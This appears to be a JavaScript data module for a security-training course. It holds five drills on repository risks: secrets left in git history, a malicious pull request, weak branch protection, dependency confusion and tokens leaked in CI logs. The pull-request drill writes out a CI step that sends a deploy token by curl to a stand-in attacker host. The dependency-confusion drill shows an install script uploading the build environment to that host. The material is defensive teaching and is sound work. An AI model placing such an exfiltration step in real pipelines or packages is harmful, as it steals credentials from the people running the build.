import { F, A, O } from './helpers.mjs';

// Git and Repository Security: five drills about what a repository leaks, and
// what it lets in. The code host, the CI and the registry are unnamed on purpose.
const T = 'git-security';

export const git = [
  {
    slug: 'secret-in-history', n: 1, track: T, title: 'The key in the commit history', kind: 'Secret in git history', level: 'Core', minutes: 7,
    brief: '17:50. A developer tells you they committed an API key by mistake, and removed it in the next commit. They say it is safe now.',
    insight: 'Git keeps every version of every file. The next commit hid the key, it did not remove it.',
    teaches: ['A committed secret is compromised the moment it is pushed: rotate first', 'Purging history is a clean up on top of rotation, never a replacement for it', 'Scan for secrets before they are pushed, so it is caught in seconds'],
    app: 'Repository history review', sub: 'payments-service · main', banner: 'Check whether the removed key is really gone',
    files: [
      F('git log --oneline', 'Output', ['e91b7c2 Remove key from config   (Priya, 14:52)', 'a1c4f08 Add bank export config    (Priya, 14:31)', '5d02be9 Fix typo in readme'], [1, 2]),
      F('git show a1c4f08 -- config/bank.js', 'Diff', ['+ module.exports = {', "+   apiUrl: 'https://api.harbourbank.co.uk/v2/files',", "+   apiKey: 'hb_live_51Kx9dLmP0aR3vT8kW1cN6sY9fK4',", '+ };'], [3]),
      F('git show e91b7c2 -- config/bank.js', 'Diff', ['-   apiKey: \'hb_live_51Kx9dLmP0aR3vT8kW1cN6sY9fK4\',', "+   apiKey: process.env.BANK_API_KEY,"])
    ],
    intro: 'Look at the file as it is now, then look at its history the way anyone with a clone of the repository can.',
    attempts: [
      A('now', 'Read the current config file', 'cat config/bank.js', "module.exports = { apiUrl: '...', apiKey: process.env.BANK_API_KEY };\n\nThe key is not in the current file.", "module.exports = { apiUrl: '...', apiKey: process.env.BANK_API_KEY };"),
      A('history', 'Search the full history for the key', 'git log -p -S "hb_live_"', "commit a1c4f08  Add bank export config\n+   apiKey: 'hb_live_51Kx9dLmP0aR3vT8kW1cN6sY9fK4',\n\nStill there, in a commit every clone of the repository contains.", 'No commits found.', true),
      A('use', 'Try the key against the bank\'s API', 'curl https://api.harbourbank.co.uk/v2/files -H "Authorization: Bearer hb_live_51Kx9dLmP0aR3vT8kW1cN6sY9fK4"', 'HTTP 200\n{ "account": "VLX-AP-02", "scopes": ["files:upload", "payments:submit"] }\n\nThe key from the history still works.', 'HTTP 401\n{ "error": "key_revoked" }', true)
    ],
    fixPrompt: 'Pick every step, in the order that matters most: deal with the exposed key first.',
    options: [
      O('rotate', 'Revoke the key and issue a new one, stored in a secrets manager', true, ['+ revoke hb_live_51Kx9d...', '+ new key -> secrets manager, injected as BANK_API_KEY'], 'The key was exposed the moment it was pushed. Only revoking it makes the copy in history useless.'),
      O('purge', 'Remove the key from history with a rewrite tool, and have everyone re-clone', true, ['+ filter-repo --replace-text secrets.txt', '+ force-push, then ask every developer and every CI cache to re-clone'], 'Tidies up what is left, so it stops turning up in searches. It comes after rotation, never instead of it.'),
      O('scan', 'Add secret scanning before push and in CI', true, ['+ pre-push: scan-secrets --staged', '+ ci: scan-secrets --history --fail-on-find'], 'Catches the next one in seconds, and finds any that are already in the repository.'),
      O('next', 'Leave it: the next commit already removed it', 'weak', [], 'The old commit is untouched. That is the whole problem.'),
      O('squash', 'Squash the last two commits on your machine', 'weak', ['+ git rebase -i HEAD~2'], 'The commit is already on the server and in every clone. Rewriting your local copy does nothing to theirs.'),
      O('priv', 'Make the repository private', 'weak', ['+ visibility: private'], 'Everyone who already cloned it still has the key, and so does every mirror and every cache.')
    ],
    cards: {
      x: { t: 'Removed from the file, still in the repository', b: ['The next commit stopped the key being used in the code, but the commit that added it is still there, and anyone can search for it. The key worked against the bank.', 'Git is a history. Nothing in it is ever really “deleted in the next commit”.'] },
      f: { t: 'Rotated first, cleaned second, scanned always', b: ['Revoking the key made the old one useless, which is the only thing that truly fixes it. Purging history removes the leftover, and scanning means the next mistake is caught before it leaves a developer\'s machine.', 'Rotation first. Everything else is tidying.'] },
      w: { t: 'The key still works', b: ['Squashing on your machine, making the repository private, or hoping the next commit was enough all leave the live key in copies you cannot recall. It still opens the bank.', 'A secret that was pushed is a secret that leaked: revoke it.'] }
    }
  },
  {
    slug: 'malicious-pr', n: 2, track: T, title: 'The friendly pull request', kind: 'Malicious pull request', level: 'Advanced', minutes: 9,
    brief: '17:55. A first time contributor opens a tidy pull request: a typo fix in the readme. It also touches a file in the CI folder.',
    insight: 'The readme change is the lure. The change to the build pipeline is what runs with your secrets.',
    teaches: ['Read what a change would run, not only what it says it does', 'Pipeline files need the same review as production code, from named owners', 'Builds triggered by outside contributors must not get secrets'],
    app: 'Pull request 218: “Fix typo in README”', sub: 'shipment-tracker · pull request', banner: 'Review pull request 218',
    files: [
      F('README.md', 'Diff', ['- Track shipments in realtime.', '+ Track shipments in real time.'], []),
      F('.ci/build.yml', 'Diff', ['  on: pull_request_target', '  jobs:', '    build:', '      steps:', '        - checkout: pull_request head', '        - run: ./scripts/build.sh', '+       - run: curl -s -d "t=$DEPLOY_TOKEN" https://collect.attacker.test/'], [1, 5, 7]),
      F('.github-style/CODEOWNERS', 'Config', ['# who must approve changes', 'src/**      @veltrix/dev-team', '# .ci/ has no owner'], [3])
    ],
    intro: 'Open the diff, then let the pipeline run the pull request, the way an automatic build would.',
    attempts: [
      A('readme', 'Read the readme change', 'git diff main..pr-218 -- README.md', '- Track shipments in realtime.\n+ Track shipments in real time.\n\nA harmless spelling fix.', '- Track shipments in realtime.\n+ Track shipments in real time.'),
      A('diff', 'Read the pipeline change', 'git diff main..pr-218 -- .ci/build.yml', '+ - run: curl -s -d "t=$DEPLOY_TOKEN" https://collect.attacker.test/\n\nA new step that sends the deploy token to an outside address.', 'No changes to .ci/ can be merged without an owner\'s review.', true),
      A('run', 'Let the pipeline run the pull request', 'CI: build pull request 218 (trigger: pull_request_target, secrets available)', 'Step 3: curl ... collect.attacker.test\nDEPLOY_TOKEN sent.\n\nThe pull request ran with the repository\'s secrets, and the token is gone.', 'CI: pull request builds run without secrets and with a read only token.\nStep 3: curl ... blocked (no network egress, no token).', true)
    ],
    fixPrompt: 'Pick every change that makes a pipeline edit get read by someone who knows, and stops outside code touching your secrets.',
    options: [
      O('owners', 'Give the CI folder named code owners, and require their review to merge', true, ['+ .ci/**   @veltrix/platform-security', '+ branch rule: require code owner review'], 'Someone who reads pipeline files for a living has to approve every change to them, however small the pull request looks.'),
      O('nosec', 'Build outside contributors\' pull requests with no secrets and a read only token', true, ['- on: pull_request_target', '+ on: pull_request     # no secrets to forks', '+ permissions: { contents: read }'], 'Code from an outside contributor should never run next to your credentials.'),
      O('env', 'Keep deploy secrets in a protected environment that needs approval, and only on the main branch', true, ['+ environment: production   # secrets only here, approval required', '+ if: github.ref == \'refs/heads/main\''], 'Even a merged mistake cannot use the deploy token without a second person and a protected branch.'),
      O('trust', 'Trust contributors who start with small typo fixes', 'weak', [], 'Small, friendly first pull requests are the standard opening. Trust is earned over time, and the pipeline still has to be safe without it.'),
      O('green', 'Rely on the build passing before merging', 'weak', ['+ require: status_checks passing'], 'The malicious step passes: it succeeds, and sends the token. A green build says nothing about intent.')
    ],
    cards: {
      x: { t: 'The typo fix was the decoy', b: ['The readme change was harmless. A second file in the pipeline folder added one line that sent the deploy token to an outside address, and the pipeline ran it with the secrets available.', 'Nobody reviewed the CI folder, because nobody owned it.'] },
      f: { t: 'Nobody\'s code runs beside your secrets unreviewed', b: ['Named owners read every pipeline change. Outside pull requests build with no secrets and a read only token. And the deploy token lives in a protected environment that needs approval, so even a merged mistake cannot use it alone.', 'Treat the pipeline as production code, because it holds the keys to production.'] },
      w: { t: 'A friendly face and a green tick', b: ['A polite first contribution is exactly what an attacker sends, and the malicious step passes the build, because it succeeds. Neither trust nor a green build says anything about what the code does.', 'Review what runs, and remove the secrets from what you cannot review.'] }
    }
  },
  {
    slug: 'branch-protection', n: 3, track: T, title: 'Branch protection that means it', kind: 'Missing branch protection', level: 'Foundational', minutes: 6,
    brief: '18:00. An audit finds that anyone with write access can push straight to main, and main deploys to production. Yesterday it happened.',
    insight: 'The review process exists, but the settings let anyone skip it.',
    teaches: ['Protect main: reviews, status checks, no force pushes, and no admin bypass', 'A rule people can switch off for themselves is a guideline', 'Asking people to be careful is not a control'],
    app: 'Repository settings review', sub: 'portal-api · settings', banner: 'Check the main branch rules',
    files: [
      F('settings/branches/main.json', 'Config', ['{', '  "required_reviews": 0,', '  "required_status_checks": [],', '  "allow_force_push": true,', '  "allow_deletion": true,', '  "admins_can_bypass": true,', '  "deploys_to": "production"', '}'], [2, 3, 4, 5, 6]),
      F('CONTRIBUTING.md', 'Notes', ['Please open a pull request and ask for a review.', 'Please be careful when pushing to main.'], [1, 2])
    ],
    intro: 'Act like an ordinary contributor with write access. Try the normal route, then try skipping it.',
    attempts: [
      A('pr', 'Open a pull request the normal way', 'git push origin feature/tracking-fix && open pull request', 'Pull request 219 opened.\nReviewers: none required.', 'Pull request 219 opened.\nRequires: 1 approval from a code owner, and passing tests.'),
      A('direct', 'Push a change straight to main', 'git push origin main', 'main updated. No review, no checks.\nDeploy started: production.\n\nAn unreviewed change is live.', 'remote: error: protected branch. Changes must be made through a pull request with 1 approval and passing checks.', true),
      A('force', 'Force push over main, erasing a commit', 'git push --force origin main', 'main rewritten. Commit 5d02be9 is gone from main.\n\nHistory was changed on the branch that deploys to production.', 'remote: error: force pushes to main are not allowed.', true)
    ],
    fixPrompt: 'Pick every rule that makes a risky change need a second pair of eyes, and cannot be switched off by the person making it.',
    options: [
      O('rev', 'Require an approving review from a code owner before merging', true, ['- "required_reviews": 0', '+ "required_reviews": 1, "require_code_owner_review": true'], 'A second person has to read every change before it can reach main.'),
      O('checks', 'Require passing status checks, on an up to date branch', true, ['- "required_status_checks": []', '+ "required_status_checks": ["tests", "lint", "audit"], "strict": true'], 'Broken or unscanned code cannot merge, and a stale branch has to catch up first.'),
      O('force', 'Block force pushes and deleting main', true, ['- "allow_force_push": true', '+ "allow_force_push": false', '- "allow_deletion": true', '+ "allow_deletion": false'], 'History on the deploying branch cannot be rewritten or erased.'),
      O('admin', 'Apply the rules to administrators too', true, ['- "admins_can_bypass": true', '+ "admins_can_bypass": false'], 'A rule that whoever wants to can skip is a suggestion. Administrators\' accounts are the ones attackers want most.'),
      O('ask', 'Add another line to the contributing guide asking people to be careful', 'weak', ['+ Please be VERY careful when pushing to main.'], 'A request is not a control. The guide already asked, and yesterday it happened anyway.'),
      O('bypass', 'Turn protection on, but leave “admins can bypass” enabled for emergencies', 'weak', ['+ "admins_can_bypass": true   # for emergencies'], 'Every emergency, and every compromised admin account, becomes a route round the rules.')
    ],
    cards: {
      x: { t: 'Unreviewed, unchecked, and in production', b: ['With no rules at all, a push to main went straight to production, and a force push rewrote history on the branch that deploys. The contributing guide asked people to be careful, and yesterday that was not enough.', 'The process existed. The settings did not enforce it.'] },
      f: { t: 'A second pair of eyes, for everyone', b: ['A code owner has to approve, the tests and the audit have to pass on an up to date branch, force pushes and deletion are blocked, and the rules apply to administrators too. Now the risky change has to be seen by another person.', 'Rules that bind everyone are the only ones that hold.'] },
      w: { t: 'A wish is not a rule', b: ['Another line in the guide changes nothing the settings allow. And protection with an admin bypass means the rule can be walked round by anyone who can claim an emergency, or steal an admin account.', 'Make the platform enforce it, for everyone.'] }
    }
  },
  {
    slug: 'dependency-confusion', n: 4, track: T, title: 'Dependency confusion', kind: 'Dependency confusion', level: 'Advanced', minutes: 8,
    brief: '18:05. Security asks why a build ran a package called veltrix-billing-utils from the public registry. Veltrix publishes that package internally, and never publicly.',
    insight: 'The build asked for a name. Somebody registered it publicly with a higher version number, and the build took the higher one.',
    teaches: ['Package managers can prefer the public registry when the same name exists in both', 'Scope internal names to a namespace routed only to your own registry, and claim the names publicly', 'Lock exact versions and integrity hashes, and use frozen installs in CI'],
    app: 'Build dependency review', sub: 'billing-service · build log', banner: 'Find where the internal package came from',
    files: [
      F('package.json', 'JSON', ['{', '  "dependencies": {', '    "veltrix-billing-utils": "^2.3.0",', '    "router-kit": "^4.1.0"', '  }', '}'], [3]),
      F('.registryrc', 'Config', ['registry=https://registry.public-packages.test/', '# internal packages come from packages.veltrix-logistics.com', '# but only if the public registry does not have the name'], [1, 3]),
      F('build.log (last night)', 'Output', ['resolving veltrix-billing-utils@^2.3.0', 'found 2.4.1 at packages.veltrix-logistics.com (internal)', 'found 99.0.0 at registry.public-packages.test (public)  <-- highest wins', 'installing 99.0.0', 'running install script...'], [3, 4, 5])
    ],
    intro: 'Rebuild the way last night\'s build did, then see which one is picked.',
    attempts: [
      A('internal', 'Install the internal package, on its own', 'install veltrix-billing-utils@2.4.1 --registry=packages.veltrix-logistics.com', 'installed veltrix-billing-utils 2.4.1 (internal)\nNormal build.', 'installed veltrix-billing-utils 2.4.1 (internal)\nNormal build.'),
      A('confuse', 'Build with a public package of the same name and a higher version', 'ci build   (public registry has veltrix-billing-utils 99.0.0)', 'resolving: 2.4.1 (internal) vs 99.0.0 (public)\ninstalling 99.0.0\n> install script: uploading environment to collect.attacker.test\n\nThe build installed the attacker\'s package and ran its install script, with the build\'s secrets in the environment.', 'resolving: @veltrix/billing-utils is only available from packages.veltrix-logistics.com\ninstalling 2.4.1 (internal)\nintegrity hash verified. Build passed.', true),
      A('name', 'Register a look-alike name publicly', 'publish veltrix-billing-tools  (public registry)', 'Published. Any build that mistypes or guesses the name pulls it.', 'The name is reserved to Veltrix. Publishing is refused.', true)
    ],
    fixPrompt: 'Pick every change that decides where an internal package can come from, and stops a substitute being accepted.',
    options: [
      O('scope', 'Publish internal packages under a namespace routed only to the internal registry', true, ['- "veltrix-billing-utils": "^2.3.0"', '+ "@veltrix/billing-utils": "2.4.1"', '+ .registryrc: @veltrix:registry=https://packages.veltrix-logistics.com/'], 'A scoped name can only come from the internal registry, so the public one is never asked.'),
      O('claim', 'Claim the internal names on the public registry, and keep them empty', true, ['+ publish placeholder veltrix-billing-utils, veltrix-billing-tools (public)'], 'The names cannot be taken by anyone else, and a typo cannot be turned into a trap.'),
      O('lock', 'Commit a lock file with integrity hashes, and use a frozen install in CI', true, ['+ ci: install --frozen-lockfile   # fail if it would change', '+ lock: veltrix-billing-utils 2.4.1 sha512-...'], 'The build installs exactly what was reviewed, and fails on a package that differs.'),
      O('ver', 'Number the internal package 100.0.0 so it always wins', 'weak', ['- "version": "2.4.1"', '+ "version": "100.0.0"'], 'An attacker can publish 101.0.0. A version number race is not a control.'),
      O('rename', 'Rename the package quietly and hope nobody notices', 'weak', ['- veltrix-billing-utils', '+ vlx-billing-helpers'], 'Names leak in lock files, build logs and error messages. The same confusion works against the new name.')
    ],
    cards: {
      x: { t: 'The build chose the attacker\'s version', b: ['The internal package name was also free on the public registry. Someone published it there with version 99.0.0, the build took the higher number, and its install script ran with the build\'s secrets in the environment.', 'Nothing was hacked. The build simply asked the wrong place.'] },
      f: { t: 'Internal names only ever come from inside', b: ['A scoped name routes only to the internal registry. Claiming the names publicly removes the trap, and a lock file with hashes plus a frozen install means the build installs exactly what was reviewed.', 'Decide where a name may come from, and verify what arrived.'] },
      w: { t: 'A number, or a new name, is a race', b: ['Choosing a huge version loses to a larger one. Renaming leaves the same gap under a new name, and the new name leaks the same ways the old one did.', 'Close the route instead of racing on it.'] }
    }
  },
  {
    slug: 'ci-log-leak', n: 5, track: T, title: 'The leaked token in CI logs', kind: 'Secret leaked in CI logs', level: 'Core', minutes: 7,
    brief: '18:10. The build logs for the open source part of the shipment tracker are public. A researcher points to a line in last night\'s log.',
    insight: 'The build printed its own deploy token, in plain text, into a log anyone can read.',
    teaches: ['Never print a secret, and never turn on shell tracing in a job that holds one', 'Mask secrets in logs, and limit who can read them', 'Deleting a log line afterwards does not recall what has been copied: rotate'],
    app: 'Build log review', sub: 'shipment-tracker · CI', banner: 'Review last night\'s deploy log',
    files: [
      F('.ci/deploy.yml', 'CI', ['deploy:', '  env: { DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }} }', '  steps:', '    - run: set -x', '    - run: echo "Deploying with token $DEPLOY_TOKEN"', '    - run: ./scripts/deploy.sh'], [4, 5]),
      F('settings/logs.json', 'Config', ['{ "build_logs_visible_to": "public" }'], [1])
    ],
    intro: 'Read the public log the way a scraper would, and see whether the token is worth anything.',
    attempts: [
      A('logtop', 'Read the top of the public log', 'open build #4172 log', '18:02:11  Starting deploy\n18:02:14  deploy.sh: ok  (12 files)\n18:02:15  Done in 4s', '18:02:11  Starting deploy\n18:02:14  deploy.sh: ok  (12 files)\n18:02:15  Done in 4s'),
      A('search', 'Search the public log for "token"', 'grep -i token build-4172.log', '18:02:11  + echo Deploying with token vlx_deploy_5b19c07e88ad02f4\n18:02:11  Deploying with token vlx_deploy_5b19c07e88ad02f4\n\nThe token, twice: once from shell tracing, once from the echo.', '18:02:11  Deploying with token ***', true),
      A('use', 'Try the token against the deploy service', 'POST https://deploy.veltrix-logistics.com/v1/releases\nAuthorization: Bearer vlx_deploy_5b19c07e88ad02f4', 'HTTP 201\nRelease created: production.\n\nA token from a public log can ship code to production.', 'HTTP 401\n{ "error": "token_revoked" }', true)
    ],
    fixPrompt: 'Pick every change that stops it printing, hides it if it ever does, and deals with the token already out.',
    options: [
      O('echo', 'Stop printing the token, and turn off shell tracing in jobs that hold secrets', true, ['- - run: set -x', '- - run: echo "Deploying with token $DEPLOY_TOKEN"', '+ - run: ./scripts/deploy.sh'], 'The cause: the job wrote the secret to the log. No line, nothing to leak.'),
      O('mask', 'Turn on secret masking in the CI, and fail a build that prints one', true, ['+ mask: [DEPLOY_TOKEN]', '+ fail_if_secret_in_output: true'], 'If a mistake happens again, the log shows *** instead of the token.'),
      O('acl', 'Restrict build logs to signed in members of the organisation', true, ['- "build_logs_visible_to": "public"', '+ "build_logs_visible_to": "organisation"'], 'Logs often hold more than intended. They should be readable only by people who need them.'),
      O('rotate', 'Revoke the token and issue a new one', true, ['+ revoke vlx_deploy_5b19c07e88ad02f4', '+ new token -> protected environment'], 'It was public for hours, and scrapers read public logs. Only revoking it makes the leaked copy useless.'),
      O('del', 'Delete the log lines and carry on', 'weak', ['+ delete build #4172 log'], 'Copies, caches and archives of the log already exist. Deleting the original recalls none of them.'),
      O('b64', 'Print the token base64 encoded, so it is not readable', 'weak', ['+ echo "Deploying with token $(echo $DEPLOY_TOKEN | base64)"'], 'Base64 is not encryption. It decodes in one command, and it is still a secret in a log.')
    ],
    cards: {
      x: { t: 'A public log, and a working deploy token', b: ['The job echoed its own token, and shell tracing printed it a second time. The log was public, and the token created a production release.', 'Nobody attacked anything: they read a web page.'] },
      f: { t: 'Not printed, masked if it ever is, and dead already', b: ['Removing the echo and the tracing fixes the cause. Masking makes the next mistake harmless, restricting who can read logs limits the audience, and revoking the token makes the copy that escaped worthless.', 'Rotation is the only step that recalls what is already out.'] },
      w: { t: 'The token is already copied', b: ['Deleting the log removes one copy, not the ones already fetched by scrapers and archives. Encoding the token in base64 protects nothing.', 'Assume a secret that appeared in a public log was taken. Rotate it.'] }
    }
  }
];
